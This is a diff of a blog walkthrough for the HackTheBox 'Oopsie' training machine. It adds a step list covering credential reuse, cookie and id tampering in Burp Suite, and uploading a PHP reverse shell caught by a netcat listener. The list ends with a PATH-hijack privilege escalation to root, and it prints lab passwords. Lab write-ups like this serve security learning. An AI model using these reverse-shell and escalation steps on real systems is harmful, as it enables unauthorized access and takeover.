@@ -97,7 +97,7 @@
   <span class="article-list-minutes">
     
     
-      8 minute read
+      11 minute read
     
   </span>
   <span class="article-list-divider">-</span>
@@ -108,7 +108,32 @@
           </header>
 
           <div class="article-content">
-            <p>I enumerate the box (which is apparently easy) and get the following:</p>
+            <p>This machine is found at IP <code class="highlighter-rouge">10.10.10.28</code>, and was quite fun to hack.</p>
+
+<h1 id="the-short-version">The Short Version</h1>
+
+<ol>
+<li>Enumerate ports via <code class="highlighter-rouge">nmap -sC -sV 10.10.10.28</code>.  Notice an HTTP server at port <code class="highlighter-rouge">80</code>;</li>
+<li>Go to <code>http://10.10.10.28:80/cdn-cgi/login/</code>;</li>
+<li>Log into the website using the username <code>admin</code> and the password <code>MEGACORP_4dm1n!!</code> from the previous (Archetype) box;</li>
+<li>Clicking on the Uploads tab we see that we need to be a "super admin" to access this.  Clicking on the Accounts tab, we see our account there.  Intercepting the Accounts tab request in Burp Suite, we can brute-force the <code>id</code> value in the query parameter for this request, and at <code>id=30</code> we find a <code>super admin</code> account;</li>
+<li>Using the super admin account's cookie parameters, now you can intercept the request to the Uploads tab and access it fully;</li>
+<li>Using these super admin cookie parameters, you can upload a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell file</a> to the server, but be sure to change the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php#L49">IP address in the script</a> to yours (<code>tun0</code> on Linux; on my mac when connected to ethernet it was the <code>utun2</code> connection);</li>
+<li>In a new terminal window, run <code class="highlighter-rouge">nc6 -nlvp 1234</code> (or just <code class="highlighter-rouge">nc</code> on Linux);</li>
+<li>Now you want to, in a new terminal window, <code class="highlighter-rouge">curl</code> <code>http://10.10.10.28/uploads/php-reverse-shell.php</code>.  This will activate the listener in your other window;</li>
+<li>In the listener window, you now have a web shell.  To turn it into a better terminal, run <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>;</li>
+<li>Run <code class="highlighter-rouge">cat /var/www/html/cdn-cgi/login/db.php</code> to get a user's login information: <code>robert</code>, whose password is <code>M3g4C0rpUs3r!</code>.  We can login as Robert using <code class="highlighter-rouge">su robert</code>;</li>
+<li>Run <code class="highlighter-rouge">cat $HOME/user.txt</code> to get the user flag!;</li>
+<li>Run <code class="highlighter-rouge">cd /tmp; export PATH=/tmp:$PATH; echo '/bin/bash' &gt; cat &amp;&amp; chmod +x cat</code>.  This will create a <code class="highlighter-rouge">cat</code> executable that takes precedence in <code class="highlighter-rouge">PATH</code>, but this executable will spawn a bash instance;</li>
+<li>Now when we go to run <code class="highlighter-rouge">bugtracker</code>, a root shell will spawn;</li>
+<li>Finally, run <code class="highlighter-rouge">PATH=$(getconf PATH) &amp;&amp; cat /root/root.txt</code> to capture the root flag!</li>
+</ol>
+
+<h1 id="the-long-version">The Long Version</h1>
+
+<p>I enumerate the box (which is apparently easy) and get the following.</p>
+
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ bash common/nmap.sh oopsie     
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:37 NZDT
 Nmap scan report for oopsie (10.10.10.28)
@@ -162,233 +187,449 @@ http://oopsie:80/uploads              (Status: 301) [Size: 302] [--&gt; http://o
 </code></pre></div></div>
 <p>But we don’t have access to any of these.</p>
 
-<p>Throughout the page’s source code, there are references to Hamburgers for some reason.  Noted.  Also in the source code I find <code class="highlighter-rouge">http://oopsie/cdn-cgi/login/script.js</code>, so I go to the subdomain <code class="highlighter-rouge">http://oopsie/cdn-cgi/login/</code> and I get to a login page.  This login page redirects to <code class="highlighter-rouge">http://oopsie/cdn-cgi/login/index.php</code>.  My immediate thought is to use SQL injections, because this is what a simple box would probably entail?</p>
+<p>Throughout the page’s source code, there are references to Hamburgers for some reason.  I think these usually refer to those three stacked bars that are for the menu icon that look like a simplistic hamburger, but this is noted.  Also in the source code I find <code class="highlighter-rouge">http://oopsie/cdn-cgi/login/script.js</code>, so I go to the subdomain <code class="highlighter-rouge">http://oopsie/cdn-cgi/login/</code> and I get to a login page.  This login page redirects to <code class="highlighter-rouge">http://oopsie/cdn-cgi/login/index.php</code>.  My immediate thought is to use SQL injections, because this is what a simple box would probably entail?</p>
 
-<p>We look at the <code class="highlighter-rouge">index.php</code> code here:</p>
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"apple-mobile-web-app-title"</span> <span class="na">content=</span><span class="s">"CodePen"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;title&gt;</span>Login<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">'/css/1.css'</span> <span class="na">rel=</span><span class="s">'stylesheet'</span> <span class="na">type=</span><span class="s">'text/css'</span><span class="nt">&gt;</span>
-<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/css/font-awesome.min.css"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/css/normalize.min.css"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;style&gt;</span>
-<span class="nt">body</span> <span class="p">{</span>
-  <span class="nl">font-family</span><span class="p">:</span> <span class="s1">"Open Sans"</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
-  <span class="nl">height</span><span class="p">:</span> <span class="m">100vh</span><span class="p">;</span>
-  <span class="nl">background</span><span class="p">:</span> <span class="sx">url("/images/1.jpg")</span> <span class="m">50%</span> <span class="nb">fixed</span><span class="p">;</span>
-  <span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">@keyframes</span> <span class="n">spinner</span> <span class="p">{</span>
-  <span class="err">0</span><span class="o">%</span> <span class="p">{</span>
-    <span class="nl">transform</span><span class="p">:</span> <span class="n">rotateZ</span><span class="p">(</span><span class="m">0deg</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="err">100</span><span class="o">%</span> <span class="p">{</span>
-    <span class="nl">transform</span><span class="p">:</span> <span class="n">rotateZ</span><span class="p">(</span><span class="m">359deg</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-<span class="o">*</span> <span class="p">{</span>
-  <span class="nl">box-sizing</span><span class="p">:</span> <span class="n">border-box</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="nc">.wrapper</span> <span class="p">{</span>
-  <span class="nl">display</span><span class="p">:</span> <span class="n">flex</span><span class="p">;</span>
-  <span class="nl">align-items</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
-  <span class="nl">flex-direction</span><span class="p">:</span> <span class="n">column</span><span class="p">;</span>
-  <span class="nl">justify-content</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
-  <span class="nl">width</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">min-height</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">padding</span><span class="p">:</span> <span class="m">20px</span><span class="p">;</span>
-  <span class="nl">background</span><span class="p">:</span> <span class="n">rgba</span><span class="p">(</span><span class="m">4</span><span class="p">,</span> <span class="m">40</span><span class="p">,</span> <span class="m">68</span><span class="p">,</span> <span class="m">0.85</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="nc">.login</span> <span class="p">{</span>
-  <span class="nl">border-radius</span><span class="p">:</span> <span class="m">2px</span> <span class="m">2px</span> <span class="m">5px</span> <span class="m">5px</span><span class="p">;</span>
-  <span class="nl">padding</span><span class="p">:</span> <span class="m">10px</span> <span class="m">20px</span> <span class="m">20px</span> <span class="m">20px</span><span class="p">;</span>
-  <span class="nl">width</span><span class="p">:</span> <span class="m">90%</span><span class="p">;</span>
-  <span class="nl">max-width</span><span class="p">:</span> <span class="m">320px</span><span class="p">;</span>
-  <span class="nl">background</span><span class="p">:</span> <span class="m">#ffffff</span><span class="p">;</span>
-  <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
-  <span class="nl">padding-bottom</span><span class="p">:</span> <span class="m">80px</span><span class="p">;</span>
-  <span class="nl">box-shadow</span><span class="p">:</span> <span class="m">0px</span> <span class="m">1px</span> <span class="m">5px</span> <span class="n">rgba</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0.3</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nc">.login.loading</span> <span class="nt">button</span> <span class="p">{</span>
-  <span class="nl">max-height</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">padding-top</span><span class="p">:</span> <span class="m">50px</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login.loading</span> <span class="nt">button</span> <span class="nc">.spinner</span> <span class="p">{</span>
-  <span class="nl">opacity</span><span class="p">:</span> <span class="m">1</span><span class="p">;</span>
-  <span class="nl">top</span><span class="p">:</span> <span class="m">40%</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login.ok</span> <span class="nt">button</span> <span class="p">{</span>
-  <span class="nl">background-color</span><span class="p">:</span> <span class="m">#8bc34a</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login.ok</span> <span class="nt">button</span> <span class="nc">.spinner</span> <span class="p">{</span>
-  <span class="nl">border-radius</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">border-top-color</span><span class="p">:</span> <span class="nb">transparent</span><span class="p">;</span>
-  <span class="nl">border-right-color</span><span class="p">:</span> <span class="nb">transparent</span><span class="p">;</span>
-  <span class="nl">height</span><span class="p">:</span> <span class="m">20px</span><span class="p">;</span>
-  <span class="nl">animation</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
-  <span class="nl">transform</span><span class="p">:</span> <span class="n">rotateZ</span><span class="p">(</span><span class="m">-45deg</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">input</span> <span class="p">{</span>
-  <span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
-  <span class="nl">padding</span><span class="p">:</span> <span class="m">15px</span> <span class="m">10px</span><span class="p">;</span>
-  <span class="nl">margin-bottom</span><span class="p">:</span> <span class="m">10px</span><span class="p">;</span>
-  <span class="nl">width</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">border</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="m">#ddd</span><span class="p">;</span>
-  <span class="nl">transition</span><span class="p">:</span> <span class="n">border-width</span> <span class="m">0.2s</span> <span class="n">ease</span><span class="p">;</span>
-  <span class="nl">border-radius</span><span class="p">:</span> <span class="m">2px</span><span class="p">;</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#ccc</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">input</span> <span class="o">+</span> <span class="nt">i</span><span class="nc">.fa</span> <span class="p">{</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span>
-  <span class="nl">font-size</span><span class="p">:</span> <span class="m">1em</span><span class="p">;</span>
-  <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
-  <span class="nl">margin-top</span><span class="p">:</span> <span class="m">-47px</span><span class="p">;</span>
-  <span class="nl">opacity</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">left</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">transition</span><span class="p">:</span> <span class="n">all</span> <span class="m">0.1s</span> <span class="n">ease-in</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">input</span><span class="nd">:focus</span> <span class="p">{</span>
-  <span class="nl">outline</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#444</span><span class="p">;</span>
-  <span class="nl">border-color</span><span class="p">:</span> <span class="m">#2196F3</span><span class="p">;</span>
-  <span class="nl">border-left-width</span><span class="p">:</span> <span class="m">35px</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">input</span><span class="nd">:focus</span> <span class="o">+</span> <span class="nt">i</span><span class="nc">.fa</span> <span class="p">{</span>
-  <span class="nl">opacity</span><span class="p">:</span> <span class="m">1</span><span class="p">;</span>
-  <span class="nl">left</span><span class="p">:</span> <span class="m">30px</span><span class="p">;</span>
-  <span class="nl">transition</span><span class="p">:</span> <span class="n">all</span> <span class="m">0.25s</span> <span class="n">ease-out</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">a</span> <span class="p">{</span>
-  <span class="nl">font-size</span><span class="p">:</span> <span class="m">0.8em</span><span class="p">;</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#2196F3</span><span class="p">;</span>
-  <span class="nl">text-decoration</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nc">.title</span> <span class="p">{</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#444</span><span class="p">;</span>
-  <span class="nl">font-size</span><span class="p">:</span> <span class="m">1.2em</span><span class="p">;</span>
-  <span class="nl">font-weight</span><span class="p">:</span> <span class="nb">bold</span><span class="p">;</span>
-  <span class="nl">margin</span><span class="p">:</span> <span class="m">10px</span> <span class="m">0</span> <span class="m">30px</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">border-bottom</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="m">#eee</span><span class="p">;</span>
-  <span class="nl">padding-bottom</span><span class="p">:</span> <span class="m">20px</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">button</span> <span class="p">{</span>
-  <span class="nl">width</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">height</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">padding</span><span class="p">:</span> <span class="m">10px</span> <span class="m">10px</span><span class="p">;</span>
-  <span class="nl">background</span><span class="p">:</span> <span class="m">#2196F3</span><span class="p">;</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span>
-  <span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
-  <span class="nl">border</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
-  <span class="nl">margin-top</span><span class="p">:</span> <span class="m">20px</span><span class="p">;</span>
-  <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
-  <span class="nl">left</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">bottom</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">max-height</span><span class="p">:</span> <span class="m">60px</span><span class="p">;</span>
-  <span class="nl">border</span><span class="p">:</span> <span class="m">0px</span> <span class="nb">solid</span> <span class="n">rgba</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0.1</span><span class="p">);</span>
-  <span class="nl">border-radius</span><span class="p">:</span> <span class="m">0</span> <span class="m">0</span> <span class="m">2px</span> <span class="m">2px</span><span class="p">;</span>
-  <span class="nl">transform</span><span class="p">:</span> <span class="n">rotateZ</span><span class="p">(</span><span class="m">0deg</span><span class="p">);</span>
-  <span class="nl">transition</span><span class="p">:</span> <span class="n">all</span> <span class="m">0.1s</span> <span class="n">ease-out</span><span class="p">;</span>
-  <span class="nl">border-bottom-width</span><span class="p">:</span> <span class="m">7px</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span> <span class="nt">button</span> <span class="nc">.spinner</span> <span class="p">{</span>
-  <span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
-  <span class="nl">width</span><span class="p">:</span> <span class="m">40px</span><span class="p">;</span>
-  <span class="nl">height</span><span class="p">:</span> <span class="m">40px</span><span class="p">;</span>
-  <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
-  <span class="nl">border</span><span class="p">:</span> <span class="m">4px</span> <span class="nb">solid</span> <span class="m">#ffffff</span><span class="p">;</span>
-  <span class="nl">border-top-color</span><span class="p">:</span> <span class="n">rgba</span><span class="p">(</span><span class="m">255</span><span class="p">,</span> <span class="m">255</span><span class="p">,</span> <span class="m">255</span><span class="p">,</span> <span class="m">0.3</span><span class="p">);</span>
-  <span class="nl">border-radius</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
-  <span class="nl">left</span><span class="p">:</span> <span class="m">50%</span><span class="p">;</span>
-  <span class="nl">top</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">opacity</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
-  <span class="nl">margin-left</span><span class="p">:</span> <span class="m">-20px</span><span class="p">;</span>
-  <span class="nl">margin-top</span><span class="p">:</span> <span class="m">-20px</span><span class="p">;</span>
-  <span class="nl">animation</span><span class="p">:</span> <span class="n">spinner</span> <span class="m">0.6s</span> <span class="n">infinite</span> <span class="n">linear</span><span class="p">;</span>
-  <span class="nl">transition</span><span class="p">:</span> <span class="nb">top</span> <span class="m">0.3s</span> <span class="m">0.3s</span> <span class="n">ease</span><span class="p">,</span> <span class="n">opacity</span> <span class="m">0.3s</span> <span class="m">0.3s</span> <span class="n">ease</span><span class="p">,</span> <span class="n">border-radius</span> <span class="m">0.3s</span> <span class="n">ease</span><span class="p">;</span>
-  <span class="nl">box-shadow</span><span class="p">:</span> <span class="m">0px</span> <span class="m">1px</span> <span class="m">0px</span> <span class="n">rgba</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0.2</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nc">.login</span><span class="nd">:not</span><span class="o">(</span><span class="nc">.loading</span><span class="o">)</span> <span class="nt">button</span><span class="nd">:hover</span> <span class="p">{</span>
-  <span class="nl">box-shadow</span><span class="p">:</span> <span class="m">0px</span> <span class="m">1px</span> <span class="m">3px</span> <span class="m">#2196F3</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nc">.login</span><span class="nd">:not</span><span class="o">(</span><span class="nc">.loading</span><span class="o">)</span> <span class="nt">button</span><span class="nd">:focus</span> <span class="p">{</span>
-  <span class="nl">border-bottom-width</span><span class="p">:</span> <span class="m">4px</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="nt">footer</span> <span class="p">{</span>
-  <span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
-  <span class="nl">padding-top</span><span class="p">:</span> <span class="m">50px</span><span class="p">;</span>
-  <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#ddd</span><span class="p">;</span>
-  <span class="nl">font-weight</span><span class="p">:</span> <span class="nb">normal</span><span class="p">;</span>
-  <span class="nl">text-shadow</span><span class="p">:</span> <span class="m">0px</span> <span class="m">-1px</span> <span class="m">0px</span> <span class="n">rgba</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0.2</span><span class="p">);</span>
-  <span class="nl">font-size</span><span class="p">:</span> <span class="m">0.8em</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nt">footer</span> <span class="nt">a</span><span class="o">,</span> <span class="nt">footer</span> <span class="nt">a</span><span class="nd">:link</span> <span class="p">{</span>
-  <span class="nl">color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span>
-  <span class="nl">text-decoration</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nt">&lt;/style&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-  <span class="nb">window</span><span class="p">.</span><span class="nx">console</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">console</span> <span class="o">||</span> <span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{};</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/prefixfree.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-  <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/type=embed/gi</span><span class="p">))</span> <span class="p">{</span>
-    <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">resize</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body</span> <span class="na">translate=</span><span class="s">"no"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"wrapper"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"login"</span> <span class="na">action=</span><span class="s">"/cdn-cgi/login/index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
-<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Log in<span class="nt">&lt;/p&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"Username"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">autofocus</span> <span class="nt">/&gt;</span>
-<span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-user"</span><span class="nt">&gt;&lt;/i&gt;</span>
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Password"</span> <span class="nt">/&gt;</span>
-<span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-key"</span><span class="nt">&gt;&lt;/i&gt;</span>
-<span class="nt">&lt;button&gt;</span>
-<span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"spinner"</span><span class="nt">&gt;&lt;/i&gt;</span>
-<span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"state"</span><span class="nt">&gt;</span>Log in<span class="nt">&lt;/span&gt;</span>
-<span class="nt">&lt;/button&gt;</span>
-<span class="nt">&lt;/form&gt;</span>
-<span class="nt">&lt;/p&gt;</span>
-<span class="nt">&lt;/div&gt;</span>
-<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
-<span class="nt">&lt;script </span><span class="na">id=</span><span class="s">"rendered-js"</span><span class="nt">&gt;</span>
-<span class="kd">var</span> <span class="nx">working</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
-<span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.login</span><span class="dl">'</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">submit</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
-  <span class="k">if</span> <span class="p">(</span><span class="nx">working</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
-  <span class="nx">working</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
-  <span class="kd">var</span> <span class="nx">$this</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
-  <span class="nx">$state</span> <span class="o">=</span> <span class="nx">$this</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="dl">'</span><span class="s1">button &gt; .state</span><span class="dl">'</span><span class="p">);</span>
-  <span class="nx">$this</span><span class="p">.</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">loading</span><span class="dl">'</span><span class="p">);</span>
-  <span class="nx">$state</span><span class="p">.</span><span class="nx">html</span><span class="p">(</span><span class="dl">'</span><span class="s1">Authenticating</span><span class="dl">'</span><span class="p">);</span>
-  <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
-    <span class="nx">$this</span><span class="p">.</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">ok</span><span class="dl">'</span><span class="p">);</span>
-    <span class="nx">$state</span><span class="p">.</span><span class="nx">html</span><span class="p">(</span><span class="dl">'</span><span class="s1">Welcome back!</span><span class="dl">'</span><span class="p">);</span>
-    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
-      <span class="nx">$state</span><span class="p">.</span><span class="nx">html</span><span class="p">(</span><span class="dl">'</span><span class="s1">Log in</span><span class="dl">'</span><span class="p">);</span>
-      <span class="nx">$this</span><span class="p">.</span><span class="nx">removeClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">ok loading</span><span class="dl">'</span><span class="p">);</span>
-      <span class="nx">working</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
-    <span class="p">},</span> <span class="mi">4000</span><span class="p">);</span>
-  <span class="p">},</span> <span class="mi">3000</span><span class="p">);</span>
-<span class="p">});</span>
-<span class="c1">//# sourceURL=pen.js</span>
-    <span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
-</code></pre></div></div>
-
-<p>So we see that there is a <code class="highlighter-rouge">pen.js</code> subdomain/file after <code class="highlighter-rouge">index.php</code>.</p>
+<p>We look at the <code class="highlighter-rouge">index.php</code> code here, and we see that there is a <code class="highlighter-rouge">pen.js</code> subdomain/file after <code class="highlighter-rouge">index.php</code>.</p>
 
 <p>While searching for ways to penetrate using <code class="highlighter-rouge">pen.js</code>, I found <a href="https://www.exploit-db.com/papers/12871">this seemingly useful resource</a>.</p>
+
+<p>We have recently completed the Archetype starting box, and I got a nudge from Reddit to think about stuff from there.  So I try username <code class="highlighter-rouge">admin</code> and the admin password for that box: <code class="highlighter-rouge">MEGACORP_4dm1n!!</code>.  Indeed, it works and we are faced with a repair management system admin page.</p>
+
+<p><img src="/images/oopsie-admin.png" alt="_config.yml" /></p>
+
+<p>Clicking on the Uploads tab, it says we need <em>super</em> admin rights…</p>
+
+<p><img src="/images/oopsie-super-admin.png" alt="_config.yml" /></p>
+
+<p>Now clicking on the Accounts tab, we are faced with a table with one admin user!</p>
+
+<table align="center">
+	<thead>
+		<tr>
+			<td>Access ID</td>
+			<td>Name</td>
+			<td>Email</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>34322</code></td>
+			<td>admin</td>
+			<td><code>admin@megacorp.com</code></td>
+		</tr>
+	</tbody>
+</table>
+
+<p>Given that it has an ID, I am curious what happens if we intercept the Uploads request.  Using Burp Suite, we get the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+Host: oopsie
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://oopsie/cdn-cgi/login/admin.php?content=accounts&amp;id=1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: user=34322; role=admin
+Connection: close
+</code></pre></div></div>
+
+<p>So that one-row table seems to be us?  But we need <code class="highlighter-rouge">superadmin</code> rights.  So I change <code class="highlighter-rouge">role=superadmin</code> but still the same error.  I also tried <code class="highlighter-rouge">role=super%20admin</code>, <code class="highlighter-rouge">role=super-admin</code>, and <code class="highlighter-rouge">role=super admin</code>, but no luck.  Worth a try.</p>
+
+<p>Now to the Branding tab, we see another one-row table:</p>
+<table align="center">
+	<thead>
+		<tr>
+			<td>Brand ID</td>
+			<td>Model</td>
+			<td>Price</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>10</code></td>
+			<td><code>MC-1123</code></td>
+			<td>$110,240</td>
+		</tr>
+	</tbody>
+</table>
+
+<p>Though it probably won’t come up, note that they are not from certain parts of Europe, as they are using a numerical comma indicitive of a separator, not a decimal point (cars wouldn’t be as low as $110).</p>
+
+<p>Now onto the Clients page:</p>
+
+<table align="center">
+	<thead>
+		<tr>
+			<td>Client ID</td>
+			<td>Name</td>
+			<td>Email</td>
